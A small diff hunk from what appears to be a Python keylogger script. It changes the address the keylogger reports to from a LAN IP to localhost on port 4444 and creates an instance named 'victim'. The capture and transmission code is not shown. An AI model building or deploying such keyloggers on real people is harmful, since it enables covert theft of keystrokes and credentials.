@@ -63,7 +63,7 @@ class Keylogger():
 
 if __name__ == '__main__':
 	
-	Host = "192.168.1.20"
+	Host = "localhost"
 	Port = 4444
 	victim = Keylogger(Host, Port)
 
